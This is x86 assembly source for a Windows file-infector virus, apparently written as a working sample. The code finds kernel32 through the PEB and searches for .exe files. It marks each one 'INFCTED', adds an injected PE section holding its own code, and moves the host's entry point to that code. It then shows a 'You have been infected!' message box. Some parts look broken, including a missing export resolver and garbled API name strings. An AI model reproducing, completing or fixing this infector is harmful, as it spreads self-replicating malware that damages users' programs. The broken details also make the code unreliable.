.386
.model flat, stdcall
option casemap:none

; ---------------- helper constant offsets ------------------
PEB_LdrOffset      equ 0Ch   ; =12 PEB->Ldr
LDR_InInitOffset   equ 1Ch   ; =28 _PEB_LDR_DATA.InInitializationOrderModuleList
LDR_DllBaseOffset  equ 18h   ; =24 _LDR_DATA_TABLE_ENTRY.DllBase
LDR_BaseNameOffset equ 2Ch   ; =44 _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
IMAGE_DOS_e_lfanew equ 3Ch   ; =60 e_lfanew
OPTIONAL_EPT       equ 28h   ; =40 AddressOfEntryPoint inside OptionalHeader
WIN32_FIND_DATA_sz equ 260h  ; =608 minimal buffer for filename
INVALID_HANDLE     equ -1    ; Giá trị lỗi trả về từ API
GEN_READ_WRITE     equ 80h or 40h    ;= 128 | 64
FILE_SHARE_R       equ 1
OPEN_EXISTING      equ 3
FILE_END_PTR       equ 2

; -------------- R/W fields embedded in code ---------------
msgBoxPtr  dd 0
getProcPtr dd 0
loadLibPtr dd 0
markerTxt  db 'INFCTED',0
origOEP    dd 0
selfSize   dd 0

; ----------------------------------------------------------
.code
shell_begin label byte
start:
    ; === 1. Locate kernel32 base ===
    xor     eax,eax
    mov     eax,fs:[30h]
    mov     eax,[eax+PEB_LdrOffset]
    mov     esi,[eax+LDR_InInitOffset]
find_k32:
    mov     ebx,[esi+LDR_DllBaseOffset]      ; EBX = DllBase
    mov     edi,[esi+LDR_BaseNameOffset]     ; EDI = ptr UNICODE name
    mov     eax,[edi]                        ; 2 wchar: 'k','e'
    or      eax,20202020h
    cmp     eax,0065006Bh
    jne     next_mod
    mov     eax,[edi+4]
    or      eax,20202020h
    cmp     eax,006E0072h
    jne     next_mod
    mov     ax,[edi+8]
    or      ax,2020h
    cmp     ax,0065h
    jne     next_mod
    jmp     got_k32
next_mod:
    mov     esi,[esi]
    jmp     find_k32

; === 2. Resolve GetProcAddress / LoadLibraryA ===
got_k32:
    push    ebx
    call    resolve_exports
    mov     [getProcPtr], eax
    mov     [loadLibPtr], edx

; === 3. Load user32 & MessageBoxA ===
    sub     esp, 12
    mov     dword ptr [esp], 72657375h
    mov     dword ptr [esp+4], 642E3233h
    mov     dword ptr [esp+8], 006C6C00h
    push    esp
    call    edx
    add     esp, 16
    mov     ebx, eax

    sub     esp, 12
    mov     dword ptr [esp], 0073654Dh
    mov     dword ptr [esp+4], 65676173h
    mov     dword ptr [esp+8], 41786F42h
    push    esp
    push    ebx
    call    [getProcPtr]
    add     esp, 16
    mov     [msgBoxPtr], eax

; === 4. Calculate self size ===
    call    $+5
    pop     esi
    lea     edi, shell_end
    sub     edi, esi
    mov     [selfSize], edi

; === 5. Save host OEP ===
    mov     eax,fs:[30h]
    mov     eax,[eax+10h]
    mov     ecx,[eax+IMAGE_DOS_e_lfanew]
    mov     ecx,[eax+ecx+OPTIONAL_EPT]
    add     ecx,eax
    mov     [origOEP], ecx

; === 6. Cross‑infect *.exe ===
    sub     esp,8
    mov     dword ptr [esp],6578652Ah
    mov     dword ptr [esp+4],000065
    push    esp
    sub     esp,WIN32_FIND_DATA_sz
    mov     edi,esp
    push    edi
    call    find_first
    add     esp,WIN32_FIND_DATA_sz+8
    mov     ebx,eax

infect_loop:
    cmp     ebx,INVALID_HANDLE
    je      infect_done
    lea     esi,[edi+2Ch]
    push    0
    push    GEN_READ_WRITE
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_R
    push    esi
    call    create_file
    mov     ecx,eax
    cmp     eax,INVALID_HANDLE
    je      next_file
    sub     esp,32
    push    0
    lea     edx,[esp]
    push    edx
    push    32
    push    ecx
    call    read_file
    mov     edx,esp
    mov     edi,offset markerTxt
scan_loop:
    mov     al,[edx]
    cmp     al,0
    je      not_infected
    cmp     al,[edi]
    je      already_inf
    inc     edx
    jmp     scan_loop
already_inf:
    add     esp,32
    push    ecx
    call    close_handle
    jmp     next_file

; === Begin section injection ===
not_infected:
    push    0
    push    0
    push    ecx
    call    set_ptr

    sub     esp, 1024
    lea     edi, [esp]
    push    0
    push    edi
    push    1024
    push    ecx
    call    read_file

    mov     ebx, edi
    mov     eax, [ebx + 3Ch]
    add     eax, ebx
    mov     esi, eax
    inc     word ptr [esi + 6]

    mov     cx, [esi + 6]
    dec     cx
    mov     edx, [esi + 14h]
    lea     edi, [esi + 18h + edx]
    mov     eax, 0x28
    mul     cx
    add     edi, eax

    mov     dword ptr [edi], ".inj"
    mov     dword ptr [edi+4], "ect\0"

    sub     edi, 0x28
    mov     eax, [edi + 0Ch]
    mov     ecx, [edi + 8]
    add     ecx, eax
    add     edi, 0x28
    mov     [edi + 8], ecx

    mov     eax, [selfSize]
    mov     [edi + 0Ch], eax
    mov     [edi + 10h], eax

    sub     edi, 0x28
    mov     eax, [edi + 14h]
    mov     ecx, [edi + 10h]
    add     eax, ecx
    add     edi, 0x28
    mov     [edi + 14h], eax

    mov     [edi + 24h], 0x60000020

    mov     eax, [edi + 8]
    mov     [esi + 28h], eax

    add     eax, [edi + 0Ch]
    mov     edx, [esi + 50h]
    add     edx, eax
    and     edx, 0FFFFF000h
    mov     [esi + 38h], edx

    mov     eax, [edi + 14h]
    push    0
    push    0
    push    eax
    push    ecx
    call    set_ptr

    push    0
    push    [selfSize]
    push    offset shell_begin
    push    ecx
    call    write_file

    push    0
    push    0
    push    0
    push    ecx
    call    set_ptr

    push    0
    push    1024
    push    ebx
    push    ecx
    call    write_file

    add     esp,32
    push    ecx
    call    close_handle
next_file:
    push    edi
    push    ebx
    call    find_next
    mov     ebx,eax
    jmp     infect_loop
infect_done:
    push    ebx
    call    find_close

; === 7. Payload ===
    sub     esp, 8
    mov     dword ptr [esp], 72656C41h
    mov     dword ptr [esp+4], 00000074h
    lea     ebx, [esp]

    sub     esp, 24
    mov     dword ptr [esp],    206F7559h
    mov     dword ptr [esp+4],  65766168h
    mov     dword ptr [esp+8],  65656220h
    mov     dword ptr [esp+12], 6E69206Eh
    mov     dword ptr [esp+16], 74636566h
    mov     dword ptr [esp+20], 00216465h
    lea     ecx, [esp]

    push    0
    push    ebx
    push    ecx
    push    0
    call    [msgBoxPtr]

    add     esp, 48

; === 8. Return to OEP ===
    jmp     [origOEP]

shell_end:
    nop

; === Helper wrappers ===
find_first proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],6C694646h
    mov     dword ptr [esp+4],74697273h
    mov     dword ptr [esp+8],00000041h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_first endp

find_next proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],65446E69h
    mov     dword ptr [esp+4],6C694679h
    mov     dword ptr [esp+8],00006574h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_next endp

find_close proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],6F6C4372h
    mov     dword ptr [esp+4],61466964h
    mov     dword ptr [esp+8],00006573h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_close endp

create_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],65446E69h
    mov     dword ptr [esp+4],69466574h
    mov     dword ptr [esp+8],00656C69h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
create_file endp

read_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],69466552h
    mov     dword ptr [esp+4],00656C69h
    mov     dword ptr [esp+8],0
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
read_file endp

write_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],69574652h
    mov     dword ptr [esp+4],656C6974h
    mov     dword ptr [esp+8],00000065h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
write_file endp

set_ptr proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],72507453h
    mov     dword ptr [esp+4],72657469h
    mov     dword ptr [esp+8],00000065h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
set_ptr endp
